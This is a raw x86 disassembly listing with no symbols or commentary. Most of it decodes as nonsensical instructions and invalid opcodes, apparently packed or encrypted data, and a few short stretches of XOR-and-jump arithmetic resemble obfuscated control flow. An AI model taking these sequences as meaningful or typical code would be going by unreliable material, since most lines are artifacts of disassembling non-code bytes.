  4020dc:	sub    eax,DWORD PTR [edi+0x1d4da27a]
  4020e2:	pop    edx
  4020e3:	jnp    0x40215a
  4020e5:	mov    ebx,0xfaf773a0
  4020ea:	adc    cl,dh
  4020ec:	push   0x9
  4020ee:	adc    BYTE PTR [edx],ah
  4020f0:	aaa    
  4020f1:	pop    esi
  4020f2:	mov    ds:0xad006703,al
  4020f7:	mov    eax,0x447acdc1
  4020fc:	in     al,0x92
  4020fe:	sbb    BYTE PTR [ecx],dl
  402100:	les    esi,FWORD PTR [edx]
  402102:	inc    ecx
  402103:	les    ecx,FWORD PTR [ebp+0x5f485986]
  402109:	in     eax,0xe1
  40210b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40210c:	ds dec ebx
  40210e:	stos   BYTE PTR es:[edi],al
  40210f:	push   edi
  402110:	out    0x0,al
  402112:	pop    edi
  402113:	and    al,0x76
  402115:	pop    ds
  402116:	fwait
  402117:	dec    edi
  402118:	shl    DWORD PTR [ebx],1
  40211a:	and    ebp,DWORD PTR [ecx-0x21]
  40211d:	aaa    
  40211e:	mov    bh,0xba
  402120:	jp     0x4020e5
  402122:	cmp    eax,0x42ce5f51
  402127:	in     eax,0xca
  402129:	adc    al,0xc1
  40212b:	add    DWORD PTR ds:0x3f577a85,esp
  402131:	outs   dx,DWORD PTR ds:[esi]
  402132:	out    0x7c,al
  402134:	fdivr  QWORD PTR [eax+edx*8-0x63]
  402138:	pop    esp
  402139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40213a:	aam    0x57
  40213c:	shr    ecx,1
  40213e:	xchg   ebx,eax
  40213f:	cld    
  402140:	sahf   
  402141:	adc    ebp,DWORD PTR [esi]
  402143:	adc    al,BYTE PTR [ebx+0x4ddc34dc]
  402149:	jl     0x402193
  40214b:	stos   BYTE PTR es:[edi],al
  40214c:	cmc    
  40214d:	repz lock add ebx,DWORD PTR [esi+eax*2+0x44980433]
  402156:	jne    0x402150
  402158:	movsx  edx,WORD PTR [esi+0x376f5b27]
  40215f:	push   es
  402160:	inc    esp
  402161:	lods   al,BYTE PTR ds:[esi]
  402162:	fisub  WORD PTR [ebx+0x2d]
  402165:	cmp    cl,BYTE PTR [ebx-0xd]
  402168:	(bad)  
  402169:	xchg   esp,eax
  40216a:	and    al,0xd7
  40216c:	mov    al,0x19
  40216e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40216f:	mov    al,0x49
  402171:	sbb    bh,BYTE PTR es:[edx]
  402174:	mov    ch,0x77
  402176:	jge    0x4021f1
  402178:	sub    DWORD PTR [edi-0x75],0x5f
  40217c:	(bad)  
  40217d:	xor    eax,0x5b6aca14
  402182:	sbb    edx,esp
  402184:	(bad)  
  402185:	lds    ebx,FWORD PTR [edi-0x6715bca7]
  40218b:	add    DWORD PTR [ecx+0x4eda7220],eax
  402191:	(bad)  
  402192:	hlt    
  402193:	shl    dl,0x6d
  402196:	popf   
  402197:	push   ds
  402198:	lock adc al,0x16
  40219b:	mov    cl,0x78
  40219d:	fcmovb st,st(0)
  40219f:	call   0xf60f:0x7881837
  4021a6:	mov    DWORD PTR [ebx+eax*4-0x44143b79],eax
  4021ad:	test   bh,0xfe
  4021b0:	xor    DWORD PTR [eax-0x53356257],esi
  4021b6:	jg     0x402148
  4021b8:	sub    edi,ebx
  4021ba:	std    
  4021bb:	push   ecx
  4021bc:	push   ecx
  4021bd:	dec    edi
  4021be:	in     al,dx
  4021bf:	cmp    ebx,DWORD PTR [edi]
  4021c1:	inc    ecx
  4021c2:	dec    ecx
  4021c3:	das    
  4021c4:	jl     0x402226
  4021c6:	iret   
  4021c7:	iret   
  4021c8:	sbb    cl,BYTE PTR [eax-0x6d20eba8]
  4021ce:	outs   dx,BYTE PTR ds:[esi]
  4021cf:	xchg   esp,eax
  4021d0:	repz fs pop eax
  4021d3:	add    eax,0x9db9c835
  4021d8:	(bad)  [edx]
  4021da:	test   ebp,edx
  4021dc:	ss mov esi,0x78315790
  4021e2:	aaa    
  4021e3:	add    DWORD PTR [edi-0x54],ecx
  4021e6:	cmp    DWORD PTR [esi+0x5e835452],eax
  4021ec:	adc    al,0xd2
  4021ee:	cli    
  4021ef:	je     0x4021b5
  4021f1:	(bad)  
  4021f2:	ja     0x40218f
  4021f4:	add    dl,BYTE PTR [ebx]
  4021f6:	mov    WORD PTR [edx],cs
  4021f8:	loope  0x402243
  4021fa:	mov    al,ds:0x1ef38149
  4021ff:	mul    DWORD PTR [eax+edi*1+0x6cefda01]
  402206:	adc    al,0x9d
  402208:	rcr    eax,1
  40220a:	xor    al,0xc8
  40220c:	adc    al,0x4
  40220e:	idiv   DWORD PTR [ecx+0x4b]
  402211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402212:	nop
  402213:	adc    eax,0xc1db606
  402218:	pop    eax
  402219:	jno    0x40219c
  40221b:	xchg   edi,eax
  40221c:	xchg   ebx,eax
  40221d:	cwde   
  40221e:	cdq    
  40221f:	ss sub edx,eax
  402222:	shr    BYTE PTR [edx+0x4a11d3e8],1
  402228:	pop    edx
  402229:	jo     0x402255
  40222b:	sub    al,0x8b
  40222d:	nop
  40222e:	sub    eax,0xcb8fced
  402233:	rcr    DWORD PTR [esi+0x3],0xca
  402237:	fucomip st,st(6)
  402239:	mov    al,0x87
  40223b:	mov    ds:0xa07d13a2,eax
  402240:	sub    eax,0xc2d6826
  402245:	sbb    BYTE PTR [eax+edx*2+0x6],al
  402249:	xchg   edx,eax
  40224a:	push   es
  40224b:	jmp    FWORD PTR [ebx]
  40224d:	test   BYTE PTR [edx+0x4a91671d],ch
  402253:	sub    edx,DWORD PTR [ebx+0x76bbfcd9]
  402259:	pop    esp
  40225a:	adc    ebx,eax
  40225c:	gs mov ah,0x5e
  40225f:	add    bl,BYTE PTR [esi+0x4f]
  402262:	sbb    BYTE PTR [eax],0x47
  402265:	out    dx,al
  402266:	aaa    
  402267:	call   DWORD PTR [edi-0x61]
  40226a:	inc    esp
  40226b:	push   cs
  40226c:	fld    TBYTE PTR [ecx-0x10]
  40226f:	ret    0x8601
  402272:	add    esi,esp
  402274:	and    al,ch
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [ecx+0x70eb07c9],ecx
  40229f:	add    dh,BYTE PTR [eax+0x70]
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	inc    esi
  4022a7:	mov    ds:0x3bc285f7,al
  4022ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022ad:	stos   DWORD PTR es:[edi],eax
  4022ae:	repz fwait
  4022b0:	xchg   edx,eax
  4022b1:	sbb    DWORD PTR [esp],ebp
  4022b4:	jbe    0x402279
  4022b6:	mov    ds,WORD PTR ds:[ecx+edi*1]
  4022ba:	pop    es
  4022bb:	sub    eax,0xcf2804e9
  4022c0:	jp     0x402251
  4022c2:	outs   dx,BYTE PTR ds:[esi]
  4022c3:	pusha  
  4022c4:	push   eax
  4022c5:	push   eax
  4022c6:	inc    eax
  4022c7:	or     DWORD PTR [ecx+0x1e8dc507],eax
  4022cd:	cmp    eax,0x30336832
  4022d2:	xchg   ebp,eax
  4022d3:	jmp    0x55f9:0xe86110a5
  4022da:	pop    edi
  4022db:	into   
  4022dc:	add    ah,dh
  4022de:	jo     0x40227a
  4022e0:	push   ebp
  4022e1:	ins    DWORD PTR es:[edi],dx
  4022e2:	jmp    0x4022f2
  4022e4:	dec    ebx
  4022e5:	(bad)  
  4022e6:	jmp    0x4022b7
  4022e8:	lods   al,BYTE PTR ds:[esi]
  4022e9:	fild   DWORD PTR [edx+0x36b6536e]
  4022ef:	adc    ebp,DWORD PTR [edi-0x28]
  4022f2:	adc    dh,BYTE PTR [eax]
  4022f4:	xor    eax,0xdf4fafa9
  4022f9:	push   0xfffffffa
  4022fb:	mov    dl,0xc4
  4022fd:	loop   0x40232e
  4022ff:	(bad)  
  402300:	push   ecx
  402301:	dec    esp
  402302:	or     BYTE PTR [eax+ebp*1+0x6e],dh
  402306:	fidiv  WORD PTR ss:[ecx+0x28]
  40230a:	out    0xfd,eax
  40230c:	sbb    cl,BYTE PTR [edx+esi*2]
  40230f:	out    0x7b,al
  402311:	test   eax,0x28898b52
  402316:	cs pop edx
  402318:	iret   
  402319:	out    dx,al
  40231a:	push   ss
  40231b:	cmp    edx,ecx
  40231d:	sbb    DWORD PTR [ebp+0x40f2224d],edx
  402323:	jmp    0xd5bb:0x79163aaf
  40232a:	xor    DWORD PTR [esi-0x78045a07],esp
  402330:	push   ebx
  402331:	xchg   esi,eax
  402332:	fucomi st,st(7)
  402334:	lea    ebp,[ebx+0xe399f1c]
  40233a:	pop    ecx
  40233b:	in     al,dx
  40233c:	push   edi
  40233d:	jg     0x4022fc
  40233f:	fisubr DWORD PTR [eax+0x255d543d]
  402345:	ss iret 
  402347:	test   al,0x6a
  402349:	and    DWORD PTR [ecx],edx
  40234b:	xchg   edx,eax
  40234c:	xchg   edx,eax
  40234d:	shr    BYTE PTR [ecx+0x21],cl
  402350:	mov    eax,ecx
  402352:	mov    ebp,0x7f4a7f5e
  402357:	dec    ebp
  402358:	pop    esi
  402359:	loopne 0x40239e
  40235b:	xacquire xchg BYTE PTR [esi-0x413cd648],al
  402362:	cld    
  402363:	mov    ebp,0xa77f7aee
  402368:	mov    bl,0xb2
  40236a:	jp     0x402312
  40236c:	popa   
  40236d:	jl     0x40237a
  40236f:	pop    ecx
  402370:	shl    DWORD PTR [edi-0x1ea0ed31],cl
  402376:	das    
  402377:	ss pop eax
  402379:	push   edx
  40237a:	loopne 0x40231b
  40237c:	lock sbb DWORD PTR [eax],ebp
  40237f:	pushf  
  402380:	add    al,0x89
  402382:	push   ebx
  402383:	out    0xe5,eax
  402385:	sub    DWORD PTR [ebp+ebx*1-0x7d],0xffffffc0
  40238a:	les    edi,FWORD PTR [ebx-0x5f]
  40238d:	sub    al,0x62
  40238f:	sub    esp,ebx
  402391:	cmp    al,0x8e
  402393:	xor    cl,BYTE PTR gs:[edx+0x648076d9]
  40239a:	test   al,0xa2
  40239c:	dec    esi
  40239d:	bnd ja 0x40237d
  4023a0:	sbb    ch,bl
  4023a2:	mov    BYTE PTR [esi-0x2e],ch
  4023a5:	or     edx,DWORD PTR [edi]
  4023a7:	daa    
  4023a8:	rcr    esi,1
  4023aa:	in     eax,0x55
  4023ac:	lods   al,BYTE PTR ds:[esi]
  4023ad:	jecxz  0x40240a
  4023af:	mov    ebx,edi
  4023b1:	and    eax,DWORD PTR [edx-0x5]
  4023b4:	test   DWORD PTR [ecx+edx*1+0x46ecbba5],ebp
  4023bb:	or     eax,0xacc7dbd6
  4023c0:	or     ch,BYTE PTR [eax]
  4023c2:	sbb    DWORD PTR [edx-0x4c],eax
  4023c5:	pusha  
  4023c6:	mov    bl,0x92
  4023c8:	cmp    DWORD PTR [eax],ebx
  4023ca:	inc    esi
  4023cb:	sub    eax,eax
  4023cd:	jle    0x4023dd
  4023cf:	popa   
  4023d0:	icebp  
  4023d1:	inc    ebp
  4023d2:	inc    ecx
  4023d3:	lods   al,BYTE PTR ds:[esi]
  4023d4:	adc    al,al
  4023d6:	arpl   WORD PTR [ebx-0x4a],ax
  4023d9:	xor    dh,bl
  4023db:	push   es
  4023dc:	jo     0x4023e2
  4023de:	aad    0xdb
  4023e0:	sbb    bl,BYTE PTR [edx+0x344621a6]
  4023e6:	fstp   TBYTE PTR [edx-0x3c0abdf1]
  4023ec:	pop    ecx
  4023ed:	mov    al,0xdc
  4023ef:	stc    
  4023f0:	sub    bh,al
  4023f2:	test   BYTE PTR [ecx+0x65],ah
  4023f5:	(bad)  
  4023f6:	mov    eax,0x95a3e184
  4023fb:	or     al,0x12
  4023fd:	ret    0x3e07
  402400:	fld    TBYTE PTR [ecx]
  402402:	aaa    
  402403:	(bad)
  402407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402408:	pop    ds
  402409:	ret    
  40240a:	sbb    BYTE PTR [ecx+0x15ae3e64],0x9d
  402411:	nop
  402412:	mov    ecx,0xbcd74b2b
  402417:	pop    es
  402418:	inc    esi
  402419:	mov    ch,0xbc
  40241b:	or     eax,0x8e05550e
  402420:	push   ebx
  402421:	jb     0x4023a8
  402423:	cmp    ebx,DWORD PTR [esi-0x7c3ccef9]
  402429:	xor    eax,0x9247560d
  40242e:	mov    ds:0xb90e784a,al
  402433:	shr    BYTE PTR ds:0xd786d2c0,cl
  402439:	adc    ecx,esp
  40243b:	pop    ss
  40243c:	or     al,0x12
  40243e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40243f:	pop    ss
  402440:	cmp    cl,BYTE PTR [esp+eax*1+0x43d6300b]
  402447:	stos   DWORD PTR es:[edi],eax
  402448:	aam    0x50
  40244a:	adc    ebx,DWORD PTR [ecx+ebp*4+0x9]
  40244e:	test   eax,0x4211af7d
  402453:	fmul   st(6),st
  402455:	popf   
  402456:	mov    eax,0x18339ad5
  40245b:	sbb    BYTE PTR [edx-0x33],ch
  40245e:	and    ch,cl
  402460:	jg     0x4024d7
  402462:	cmp    BYTE PTR [eax],dl
  402464:	push   ebx
  402465:	(bad)  
  402466:	dec    dl
  402468:	into   
  402469:	leave  
  40246a:	lock xchg edx,ebp
  40246d:	mov    bh,0x43
  40246f:	cdq    
  402470:	push   ebx
  402471:	(bad)  
  402473:	dec    ebx
  402474:	dec    edx
  402475:	jmp    0x5540558c
  40247a:	out    0xd5,eax
  40247c:	leave  
  40247d:	or     eax,0x16c1473a
  402482:	icebp  
  402483:	mov    edi,0xc7e6c111
  402488:	inc    ebx
  402489:	push   0xb22be440
  40248e:	popa   
  40248f:	daa    
  402490:	daa    
  402491:	jge    0x402496
  402493:	xchg   esi,eax
  402494:	mov    edi,0x75949948
  402499:	retf   
  40249a:	mov    DWORD PTR [ecx-0x1d],ebp
  40249d:	(bad)  
  40249e:	into   
  40249f:	sbb    ebx,DWORD PTR [edi]
  4024a1:	pop    eax
  4024a2:	fist   WORD PTR [ecx-0x749964e2]
  4024a8:	push   ebp
  4024a9:	enter  0x3ebb,0x8a
  4024ad:	add    BYTE PTR [eax],al
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x59c46cc9],cl
  4024f4:	sahf   
  4024f5:	jo     0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	std    
  4024fe:	xor    DWORD PTR [eax+eiz*4+0x734ed4c8],ebx
  402505:	jnp    0x4024f2
  402507:	fwait
  402508:	test   ah,dl
  40250a:	call   0x52586b2b
  40250f:	mov    ds:0xe20cbe04,eax
  402514:	mov    ebx,0xdc7361f0
  402519:	add    DWORD PTR [edx-0x73],0x29
  40251d:	ss dec esp
  40251f:	xchg   esp,eax
  402520:	frstor [ebx+0x2dcccb1d]
  402526:	pop    edi
  402527:	mov    ah,0x3
  402529:	mov    edi,0x96ae4063
  40252e:	xchg   esi,eax
  40252f:	push   esp
  402530:	adc    eax,0xec160ab3
  402535:	pop    edi
  402536:	dec    ecx
  402538:	xor    ebx,DWORD PTR [eax]
  40253a:	aad    0xce
  40253c:	mov    ds:0xb27df332,eax
  402541:	jle    0x40252c
  402543:	jb     0x40250d
  402545:	mov    al,ds:0x1661344f
  40254a:	cmp    eax,0xdf0271d2
  40254f:	(bad)  
  402550:	fisttp QWORD PTR [esi-0x61]
  402553:	dec    ebx
  402554:	jg     0x4025ac
  402556:	std    
  402557:	pop    ss
  402558:	adc    al,0xcc
  40255a:	sbb    DWORD PTR [eax],eax
  40255c:	mov    ah,0x86
  40255e:	xchg   esp,eax
  40255f:	jne    0x4025c5
  402561:	mov    ebx,0xfef38e63
  402566:	inc    eax
  402567:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  402569:	mov    ebp,0xc74ea79
  40256e:	fdivrp st(3),st
  402570:	inc    ebp
  402571:	hlt    
  402572:	jbe    0x40252c
  402574:	pop    eax
  402575:	jg     0x40254a
  402577:	push   ds
  402578:	(bad)  
  402579:	inc    BYTE PTR [esi]
  40257b:	jno    0x40251f
  40257d:	and    esi,DWORD PTR [ebp+0x27]
  402580:	mov    ch,cl
  402582:	mov    WORD PTR [ebx+0x7a],?
  402585:	jmp    0xfbe2:0x915b697f
  40258c:	sub    eax,ebx
  40258e:	jle    0x402587
  402590:	jmp    0x4025f8
  402592:	add    esp,edi
  402594:	and    al,0x94
  402596:	inc    esi
  402597:	jmp    esp
  402599:	dec    edx
  40259a:	cld    
  40259b:	cmp    eax,0x9dfeb886
  4025a0:	out    0xdb,eax
  4025a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a3:	jl     0x40253e
  4025a5:	dec    ebp
  4025a6:	jmp    0x2ba423ae
  4025ab:	outs   dx,BYTE PTR ds:[esi]
  4025ac:	je     0x402629
  4025ae:	pop    eax
  4025af:	sub    al,0x98
  4025b1:	add    ah,BYTE PTR [esi-0x47]
  4025b4:	mov    edi,0xc6c46cd3
  4025b9:	and    esp,esp
  4025bb:	stos   BYTE PTR es:[edi],al
  4025bc:	sub    edx,ebx
  4025be:	jmp    0x41a1ec84
  4025c3:	sub    DWORD PTR [edx-0x11a2e7b5],edi
  4025c9:	scas   eax,DWORD PTR es:[edi]
  4025ca:	add    edx,edx
  4025cc:	xchg   edx,eax
  4025cd:	xchg   ebp,eax
  4025ce:	cmp    ebp,ebx
  4025d0:	jne    0x4025c6
  4025d2:	cld    
  4025d3:	pusha  
  4025d4:	pop    ds
  4025d5:	das    
  4025d6:	popa   
  4025d7:	jle    0x40259b
  4025d9:	jle    0x4025f3
  4025db:	and    bh,0xf
  4025de:	push   ss
  4025df:	test   eax,0x1ed25fed
  4025e4:	adc    al,0x0
  4025e6:	xchg   esi,eax
  4025e7:	xchg   edi,eax
  4025e8:	mov    eax,ds:0x70bfdadd
  4025ed:	scas   eax,DWORD PTR es:[edi]
  4025ee:	popf   
  4025ef:	mov    ebx,0x8bffd8cb
  4025f4:	ror    BYTE PTR [eax],cl
  4025f6:	cmp    eax,0x9d818d78
  4025fb:	xor    BYTE PTR [ecx+eax*2+0x7f],dl
  4025ff:	pushf  
  402600:	xlat   BYTE PTR ds:[ebx]
  402601:	test   al,0xec
  402603:	add    al,0x6a
  402605:	add    dh,bl
  402607:	aam    0x8a
  402609:	xchg   BYTE PTR [ecx-0x45],bl
  40260c:	ficom  DWORD PTR [edx+0x4d]
  40260f:	aad    0x2e
  402611:	in     eax,0xd5
  402613:	loope  0x402618
  402615:	sub    ecx,DWORD PTR [edi-0x6d]
  402618:	push   esp
  402619:	mov    BYTE PTR [ecx+0x27],dl
  40261c:	mov    ecx,0xf42ca146
  402621:	rcr    bh,cl
  402623:	jb     0x4026a0
  402625:	pop    ebx
  402626:	addr16 mov esi,0xdbcd3cff
  40262c:	div    DWORD PTR ds:0xe6309b39
  402632:	mov    edi,0x41155d6
  402637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402638:	xor    al,0x5e
  40263a:	push   ecx
  40263b:	bound  ebx,QWORD PTR [ebp-0xf]
  40263e:	or     BYTE PTR [ecx+0x7d11da4b],dl
  402644:	rcl    BYTE PTR [ebx-0x7e],1
  402647:	mov    dh,0x8a
  402649:	mov    ds:0xd5b171f,al
  40264e:	test   eax,0x480d6c8f
  402653:	mov    esp,0xaa53ed15
  402658:	add    BYTE PTR [edi+0x47e4761f],dh
  40265e:	adc    BYTE PTR ds:0x42490195,bh
  402664:	je     0x40265d
  402666:	stos   DWORD PTR es:[edi],eax
  402667:	clc    
  402668:	call   0x9e15:0x6207cea7
  40266f:	scas   al,BYTE PTR es:[edi]
  402670:	cld    
  402671:	push   esp
  402672:	clc    
  402673:	inc    DWORD PTR [ecx+0x4c]
  402676:	mov    ds:0xeacfa22e,al
  40267b:	jp     0xfbf5a59
  402681:	rcr    BYTE PTR [ecx-0x7a34cf86],cl
  402687:	xchg   ecx,eax
  402688:	cld    
  402689:	out    0x8c,eax
  40268b:	jbe    0x4026d8
  40268d:	or     ebx,ebp
  40268f:	int    0x72
  402691:	div    DWORD PTR [ecx+0x30]
  402694:	leave  
  402695:	pop    ebx
  402696:	stos   DWORD PTR es:[edi],eax
  402697:	loopne 0x402654
  402699:	inc    edx
  40269a:	sbb    ecx,edi
  40269c:	sar    BYTE PTR [edi-0x74],cl
  40269f:	mov    edi,0x2b6684a0
  4026a4:	stc    
  4026a5:	sbb    DWORD PTR es:[ebx+0xf],eax
  4026a9:	aam    0x45
  4026ab:	push   ecx
  4026ac:	int3   
  4026ad:	outs   dx,BYTE PTR ds:[esi]
  4026ae:	popf   
  4026af:	lods   al,BYTE PTR ds:[esi]
  4026b0:	pop    edi
  4026b1:	fst    st(5)
  4026b3:	mov    eax,ds:0x2ecbf950
  4026b8:	mov    al,0x12
  4026ba:	popa   
  4026bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026bc:	data16 or bl,al
  4026bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026c0:	push   ebx
  4026c1:	imul   edx,DWORD PTR [eax+0x48b63989],0xf3df83c8
  4026cb:	loope  0x40272f
  4026cd:	stc    
  4026ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026cf:	dec    ebx
  4026d0:	cli    
  4026d1:	adc    dl,0xe0
  4026d4:	dec    eax
  4026d5:	sti    
  4026d6:	xor    DWORD PTR [edi-0x735a8ef1],ebp
  4026dc:	lods   eax,DWORD PTR ds:[esi]
  4026dd:	jecxz  0x40272c
  4026df:	cmp    eax,0xe6bc7851
  4026e4:	pop    edx
  4026e5:	mov    cl,bh
  4026e7:	inc    esp
  4026e8:	pop    eax
  4026e9:	sbb    dh,BYTE PTR [ebp-0x7735c20b]
  4026ef:	or     ebp,DWORD PTR [edx-0x6f]
  4026f2:	pop    esi
  4026f3:	loope  0x402753
  4026f5:	jl     0x402758
  4026f7:	ja     0x40268f
  4026f9:	loopne 0x4026bb
  4026fb:	xchg   edx,eax
  4026fc:	jbe    0x402689
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xb04289b0
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	push   cs
  402768:	jle    0x402786
  40276a:	jl     0x40273f
  40276c:	inc    ecx
  40276d:	cmp    al,0x24
  40276f:	pop    ss
  402770:	pop    esi
  402771:	cwde   
  402772:	pop    ecx
  402773:	or     dh,ch
  402775:	inc    ebp
  402776:	mov    dl,0x8a
  402778:	sar    DWORD PTR [ecx],cl
  40277a:	(bad)  
  40277b:	je     0x40279a
  40277d:	std    
  40277e:	fist   WORD PTR [eax]
  402780:	scas   al,BYTE PTR es:[edi]
  402781:	or     ebp,DWORD PTR [esi]
  402783:	mov    cl,0x12
  402785:	sub    eax,0xa3ca1fff
  40278a:	push   esi
  40278b:	sbb    BYTE PTR ds:0xe6a0e39,0x3e
  402792:	adc    DWORD PTR [ecx-0x3d],0xfffffffd
  402796:	mov    edx,0x6bd22de6
  40279b:	xchg   esp,eax
  40279c:	inc    esi
  40279d:	repz mov ds:0x17229858,eax
  4027a3:	shl    BYTE PTR [ebp-0xf],cl
  4027a6:	xlat   BYTE PTR ds:[ebx]
  4027a7:	add    eax,0x76485d62
  4027ac:	aas    
  4027ad:	xchg   DWORD PTR [ecx],ebx
  4027af:	adc    DWORD PTR [eax],ebp
  4027b1:	clc    
  4027b2:	bnd jno 0x4027d1
  4027b5:	outs   dx,DWORD PTR ds:[esi]
  4027b6:	or     esp,0x79
  4027b9:	push   eax
  4027ba:	cld    
  4027bb:	add    DWORD PTR [eax+0x2cf1198e],ecx
  4027c1:	scas   eax,DWORD PTR es:[edi]
  4027c2:	popf   
  4027c3:	fwait
  4027c4:	sar    BYTE PTR [esi-0x10],1
  4027c7:	cwde   
  4027c8:	sub    ebx,edx
  4027ca:	out    dx,eax
  4027cb:	pop    ecx
  4027cc:	inc    ecx
  4027cd:	mov    ds:0xc14af1f5,al
  4027d3:	jmp    0x4027fa
  4027d5:	jns    0x4027a0
  4027d7:	mov    WORD PTR [esi+eiz*1],fs
  4027da:	push   edi
  4027db:	sub    al,0xfe
  4027dd:	shl    DWORD PTR [ecx+ebx*8+0x40],1
  4027e1:	outs   dx,BYTE PTR ds:[esi]
  4027e2:	mov    bh,0xb5
  4027e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027e5:	or     al,0xe9
  4027e7:	push   ebx
  4027e8:	lods   al,BYTE PTR ds:[esi]
  4027e9:	adc    eax,0x884574cf
  4027ee:	sbb    eax,0xb89bd09d
  4027f3:	adc    eax,0xca96c8f5
  4027f8:	and    eax,0x903c6040
  4027fd:	(bad)  
  4027fe:	jmp    0x42a26d8d
  402803:	jl     0x4027e5
  402805:	push   ebx
  402806:	into   
  402807:	dec    esp
  402808:	inc    edx
  402809:	inc    ebp
  40280a:	xor    ah,BYTE PTR [ecx+0x1b]
  40280d:	loope  0x402825
  40280f:	and    bh,BYTE PTR [ebp+eax*4-0x670f811a]
  402816:	loop   0x4027cd
  402818:	sub    BYTE PTR [ebx+0x3961c38a],0x49
  40281f:	jg     0x4027f3
  402821:	dec    edx
  402822:	je     0x4027a8
  402824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402825:	push   ecx
  402826:	in     eax,0xc6
  402828:	into   
  402829:	inc    esi
  40282a:	aam    0x8a
  40282c:	push   esp
  40282d:	xchg   edi,eax
  40282e:	test   DWORD PTR [edx+0x3e],eax
  402831:	daa    
  402832:	fcomp  st(4)
  402834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402835:	imul   eax,edx,0x2eb1d81c
  40283b:	dec    esp
  40283c:	and    ebx,DWORD PTR [ecx-0x6f]
  40283f:	pop    ebp
  402840:	lods   al,BYTE PTR ds:[esi]
  402841:	add    eax,0xc3919045
  402846:	xor    ebp,ebx
  402848:	cmp    ecx,DWORD PTR [ecx+0x2a01e3dd]
  40284e:	ds mov bh,0x7d
  402851:	int    0x2a
  402853:	in     al,0x5b
  402855:	xchg   ebx,eax
  402856:	push   0xffffffbd
  402858:	dec    edx
  402859:	mov    dl,0x67
  40285b:	pusha  
  40285c:	dec    edi
  40285d:	das    
  40285e:	leave  
  40285f:	jae    0x402802
  402861:	add    dl,BYTE PTR [ebp-0x70aba77]
  402867:	(bad)  
  402868:	adc    ch,BYTE PTR [edi+esi*2]
  40286b:	jg     0x4028a4
  40286d:	in     eax,0x21
  40286f:	sub    al,0xbb
  402871:	inc    ebp
  402872:	iret   
  402873:	ins    BYTE PTR es:[edi],dx
  402874:	sub    al,BYTE PTR [ebx+0x4dab559a]
  40287a:	(bad)  
  40287c:	jb     0x4028cb
  40287e:	jle    0x4028be
  402880:	retf   
  402881:	dec    ecx
  402882:	fsub   DWORD PTR [ebx]
  402884:	add    edi,DWORD PTR [ebp+0x4faee5f1]
  40288a:	out    0x81,eax
  40288c:	enter  0x8fcb,0x81
  402890:	sbb    bl,bl
  402892:	out    dx,eax
  402893:	aaa    
  402894:	adc    ebx,0xffffffb1
  402897:	daa    
  402898:	jb     0x402910
  40289a:	loope  0x402888
  40289c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40289d:	enter  0x7613,0x4
  4028a1:	popa   
  4028a2:	mov    dl,0x9b
  4028a4:	fmul   st,st(2)
  4028a6:	cmc    
  4028a7:	daa    
  4028a8:	rcr    DWORD PTR [esi+0x42],0x81
